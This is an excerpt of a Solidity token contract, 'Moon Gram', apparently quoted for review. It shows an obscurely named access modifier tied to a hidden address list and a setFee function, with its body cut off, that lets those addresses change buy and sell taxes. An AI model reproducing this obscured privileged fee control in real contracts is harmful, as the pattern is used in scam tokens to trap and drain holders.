...
contract Ownable is Context {
    ...
    modifier gram() {
        require(isgram(msg.sender), "!MoonOwner"); _;
    }

    function isgram(address adr) public view returns (bool) {
        return Moon[adr];
    }
...
contract MoonGram is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Moon Gram";
    ...
    uint256 private constant _tTotal = 100000000 * _decimals;
    ...
    uint256 public _maxWalletSize = _tTotal * 50 / 1000;
    uint256 public _swapTokensAtAmount = 100000 * 10**9 * 2;
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public gram {
